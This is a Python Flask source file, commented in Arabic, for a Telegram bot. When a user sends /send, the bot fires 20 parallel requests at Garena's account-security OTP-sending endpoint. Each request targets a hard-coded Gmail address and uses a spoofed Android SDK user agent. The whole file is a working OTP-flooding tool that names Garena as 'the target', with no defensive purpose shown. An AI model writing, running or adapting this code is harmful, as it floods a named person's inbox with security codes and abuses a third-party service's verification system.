import requests
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, request, jsonify

app = Flask(__name__)

# إعدادات الهدف (Garena)
url = "https://100067.connect.garena.com/game/account_security/swap:send_otp"

payload = {
    'app_id': "100067",
    'email': "jabael378@gmail.com",
    'locale': "ar_MA"
}

headers = {
    'User-Agent': "GarenaMSDK/4.0.41(SM-A065F ;Android 15;ar;MA;app 1.123.1 2019120270;)",
    'Connection': "Keep-Alive",
    'Accept': "application/json",
    'Accept-Encoding': "gzip"
}

# توكن البوت (استبدله بتوكنك)
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"

def send_request(req_id):
    """إرسال طلب واحد"""
    try:
        response = requests.post(url, data=payload, headers=headers, timeout=10)
        return f"[{req_id}] {response.text}"
    except Exception as e:
        return f"[{req_id}] خطأ: {str(e)}"

def send_20_requests():
    """إرسال 20 طلب بالتوازي"""
    results = []
    with ThreadPoolExecutor(max_workers=20) as executor:
        results = list(executor.map(send_request, range(1, 21)))
    return "\n".join(results)

def send_telegram_message(chat_id, text):
    """إرسال رسالة إلى تيليغرام"""
    telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(telegram_url, json={
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "HTML"
    })

@app.route(f"/webhook/{BOT_TOKEN}", methods=["POST"])
def webhook():
    """نقطة النهاية التي يستقبلها تيليغرام"""
    update = request.get_json()
    
    if not update or "message" not in update:
        return jsonify({"status": "ok"}), 200
    
    chat_id = update["message"].get("chat", {}).get("id")
    text = update["message"].get("text", "")
    
    if not chat_id:
        return jsonify({"status": "ok"}), 200
    
    if text == "/start":
        send_telegram_message(chat_id, 
            "🚀 مرحباً! أرسل <b>/send</b> لإرسال 20 طلباً إلى Garena")
    
    elif text == "/send":
        send_telegram_message(chat_id, "⏳ جاري إرسال 20 طلباً...")
        result = send_20_requests()
        send_telegram_message(chat_id, f"✅ النتائج:\n\n{result[:4000]}")  # تيليغرام يحد 4096 حرف
    
    else:
        send_telegram_message(chat_id, "❓ أرسل /send لتشغيل الطلبات")
    
    return jsonify({"status": "ok"}), 200

@app.route("/", methods=["GET"])
def home():
    return "Webhook يعمل ✅", 200

if __name__ == "__main__":
    # تشغيل السيرفر (للاختبار المحلي)
    app.run(host="0.0.0.0", port=5000, debug=True)
